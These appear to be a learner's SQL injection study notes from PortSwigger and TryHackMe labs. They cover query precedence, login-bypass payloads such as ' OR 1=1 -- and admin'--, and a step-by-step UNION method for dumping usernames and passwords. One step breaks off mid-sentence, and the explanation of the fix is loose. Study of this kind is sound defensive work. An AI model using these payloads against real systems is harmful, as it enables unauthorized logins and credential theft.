## SQL Injection

Gemini = https://gemini.google.com/app/4fc578ae424639d4

### *Theory*

For `SELECT * FROM users WHERE username = 'INPUT' AND password = 'PASSWORD';` command in sql:

`SELECT` is used as a verb for data retrivel in SQL, it specifies that the

`*` tells to get all data

`FROM` tells which table to get the data from

`WHERE` filters the row, and will return whatever gives it a TRUE

`username = "Input"` is a boolean expression which checks if an exact string match is there and will return true or false

`AND` is an operator which would need both the previous command (username) and the command after (password) to be true to return true to `WHICH`

now someone can use SQLi to change the input to `'' OR 1=1 --` where the `--` are the comments to turn the command into `SELECT * FROM users WHERE username = '' OR 1=1 -- AND password = 'PASSWORD';`
and here the operational precedence comes in, in detail below, but yeah, this would log the guy in.

There is also the brackets method if the initial sql command is like `SELECT * FROM users WHERE (username = 'INPUT') AND (password = 'PASSWORD')`, then you could input `admin') OR ('1'='1` to turn it into `SELECT * FROM users WHERE (username = 'admin') OR ('1'='1') AND (password = 'PASSWORD')` and this would log you in!

To solve this, you should use `SELECT * FROM users WHERE username = ? AND password = ?;` which would need the input to be a string, hence solving this issue

The SQL Rulebook Hierarchy
When a database evaluates a WHERE clause with multiple conditions, it evaluates them in a strict order of operations:

Parentheses () (Highest priority — always calculated first)

Comparison operators (=, >, <, etc.)

NOT

AND

OR (Lowest priority — calculated last)

Because AND is higher priority than OR, it acts exactly like multiplication, while OR acts like addition.

### **PortSwigger**

- These inputs and everything happens in url's like `https://insecure-website.com/products?category=Gifts'--` , the format might not be the same, but concept remains intact

*SQL Injection Union Attacks* : Basically you can chain multiple SQL select together with union, then use it for attacks

Fundamental requirements for a union query to work:
- all the select queries must return the same number of columns
- data type in all select queries must be compatible which each other

- *Step 1* => Get the total number of 

## *TryHackMe*

*Detecting SQL Injection*
Before you can exploit SQL Injection, you need to find it. As a penetration tester, you should test every input that interacts with the database. Common injection points include URL parameters, form fields (login, search, comment boxes), cookies, and HTTP headers.

The simplest detection method is to inject test characters and observe the response:

- Enter a single quote ':  if the application returns a database error, the input is likely being inserted into a SQL query without proper handling.

- Try " (double quote): some queries use double quotes instead of single quotes.

- Enter ;--:  if the application behaves differently (e.g., returns different content), the comment syntax is being processed.

- Test OR 1=1: if it changes the results, the input is directly in the query's logic.

Not every test will produce a visible error. If the application suppresses errors, you may need to rely on behavioural differences (Boolean-Based) or timing delays (Time-Based) to confirm injection. We will cover each of these techniques in detail over the following tasks.

#### In band SQLi


In-Band SQLi is the most common and easily exploitable category of SQL injection. It is characterized by using the **same communication channel** for both injecting the payload and receiving the retrieved data (i.e., data is displayed directly in the web application's page response).

---

## 1. Error-Based SQL Injection

Exploits misconfigured web applications that display raw database error messages to the end-user.

* **Value:** These messages leak data regarding query structure, database software/version, table names, and sensitive column data.
* **Probing:** Injecting a single quote (`'`) to disrupt the syntax.
* **Example Indicator:**
```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' at line 1

```


* *Reconnaissance gathered:* Database engine is **MySQL**, the input is encapsulated within single quotes, and error handling is absent.



---

## 2. Union-Based SQL Injection

The primary in-band technique for extracting vast amounts of data by appending an unauthorized `SELECT` query to the original query via the `UNION` operator.

### Fundamental Prerequisites & Logic

1. **Column Match Requirement:** The `UNION` operator dictates that both queries must return the exact same number of columns, and data types must be compatible.
2. **Result Nullification:** The original application query parameter is deliberately forced to return an empty result (e.g., using an invalid ID like `0` or `-1`). This ensures that only the data extracted by the injected `UNION SELECT` statement is rendered on the page.
3. **The `information_schema`:** A built-in system database (catalog) in MySQL/PostgreSQL that contains metadata about all other databases, tables, and columns.

---

### Step-by-Step Union Exploitation Methodology

#### Step 1: Determine the Number of Columns

Incrementally append values to `UNION SELECT` until the query executes successfully without a structural/column mismatch error.

```sql
1 UNION SELECT 1       -- Error: wrong column count
1 UNION SELECT 1,2     -- Error: wrong column count
1 UNION SELECT 1,2,3   -- Success: Database contains exactly 3 columns

```

#### Step 2: Identify Displayed/Reflected Columns

Force the original query to fail by using a non-existent parameter value (e.g., `0`), and check which injected column numbers render on the screen.

```sql
0 UNION SELECT 1,2,3

```

* *Note:* If the number `3` is visible in the UI, column position 3 is your designated extraction point.

#### Step 3: Extract the Database Name

Replace the visible/reflected column integer with the database metadata function.

```sql
0 UNION SELECT 1,2,database()

```

#### Step 4: Enumerate Tables

Query the metadata schema to list all tables associated with the target database.

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'

```

* `group_concat()`: Aggregates multiple row values into a single string to bypass UI rendering limits.

#### Step 5: Enumerate Columns

Isolate the target table discovered in Step 4 and extract its respective column names.

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'

```

#### Step 6: Data Extraction (Exfiltration)

Dump the sensitive records from the targeted table.

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table

```

---

## CTF/Lab Blueprint Summary (Level 1 Walkthrough)

* **Target Vulnerability:** Injectable `id` parameter within a web application component (e.g., a blog post loader).
* **Tooling Assist:** Look for an on-screen "SQL Query box" at the bottom of the lab page to track how payloads alter the backend query structural logic in real time.

# Blind SQL Injection & Authentication Bypass Notes

Blind SQL Injection occurs when a web application processes a malicious database query but **does not display any query results or raw error messages** back to the user. Instead, success must be inferred by analyzing behavioral changes in the application (e.g., successful login, altered page content, or response time delays).

---

## 1. Authentication Bypass Mechanics

Most standard login verification forms evaluate credentials by checking if a query returns at least one valid row.

### Standard Backend Logic

```sql
SELECT * FROM users WHERE username='[INPUT_USER]' AND password='[INPUT_PASS]' LIMIT 1;

```

* **True (Row Returned):** User is authenticated and redirected to the dashboard.
* **False (Empty Result):** Authentication fails; an generic "Invalid credentials" message is triggered.

---

## 2. Exploitation Tactics (The Attack)

### Generic Authentication Bypass

By injecting a tautology (a statement that is always true) combined with a comment character, the password verification logic is completely negated.

* **Payload (Username Field):** `' OR 1=1;--`
* **Resulting Backend Query:**
```sql
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;

```



#### Logic Breakdown:

1. `username=''`: Evaluates to false (unless an empty username exists).
2. `OR 1=1`: Evaluates to **true**, forcing the entire `WHERE` clause to resolve as true for every record.
3. `;--`: The semicolon terminates the clause, and the dashes comment out the remaining password verification syntax.
4. **Outcome:** The database returns rows from the table. The application reads the first returned row and logs the attacker in as that user (typically the first entry, which is often the **Administrator**).

### Targeted User Bypass

If a specific username (e.g., `admin`) is known, the attacker can hijack that exact account without a password.

* **Payload (Username Field):** `admin'--`
* **Resulting Backend Query:**
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;

```


* **Outcome:** The database isolates the `admin` row and ignores the password string entirely, authenticating the attacker directly into the targeted account.

---

## 3. Syntax Variations Matrix

| Payload | Context / Database Engine | Description |
| --- | --- | --- |
| `' OR 1=1;--` | Standard / Generic | Works when the input parameter is encapsulated in single quotes. |
| `' OR 1=1#` | MySQL Specific | Uses the `#` symbol as an alternative comment delimiter. |
| `" OR 1=1--` | Double-Quote Context | Used when the application wraps backend inputs in double quotes (`""`). |

> 💡 **Penetration Testing Note:** Always test both the `username` and `password` fields independently. Applications may sanitize one parameter while leaving the other vulnerable to concatenation.

---

## CTF/Lab Blueprint Summary (Level 2 Walkthrough)

* **Target Vulnerability:** Blind SQLi within a standard application login form interface.
* **Execution Strategy:** Input `' OR 1=1;--` into the username field with a random string in the password field.
* **Tooling Assist:** Utilize the on-screen "SQL Query box" at the bottom of the lab page to visually inspect how your single/double quotes break out of the string literals within the backend `WHERE` clause.